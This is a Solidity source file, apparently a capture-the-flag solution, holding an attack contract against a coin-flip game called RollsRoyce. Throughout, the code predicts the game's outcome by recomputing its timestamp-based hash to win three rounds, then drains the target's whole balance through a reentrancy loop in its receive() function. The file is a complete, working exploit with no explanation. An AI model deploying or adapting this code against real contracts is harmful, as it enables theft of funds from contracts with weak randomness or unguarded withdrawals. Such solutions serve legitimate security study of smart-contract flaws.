//SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./RollsRoyce.sol";

contract HackRollsRoyce {

    RollsRoyce c;

    constructor(address payable _addr) {
        c = RollsRoyce(_addr);
    }


    function get3win() public payable{
        for (uint256 i = 0; i < 3; i++) {
            RollsRoyce.CoinFlipOption ans = flipCoin();
            c.guess{value: 1 ether}(ans);
            c.revealResults();
        }
        c.withdrawFirstWinPrizeMoneyBonus();
    }

    function flipCoin() private view returns (RollsRoyce.CoinFlipOption) {
        return
            RollsRoyce.CoinFlipOption(
                uint(
                    keccak256(abi.encodePacked(block.timestamp ^ 0x1F2DF76A6))
                ) % 2
            );
    }

    receive() external payable {
        while(address(c).balance>0){
            c.withdrawFirstWinPrizeMoneyBonus();
        }
    }

}
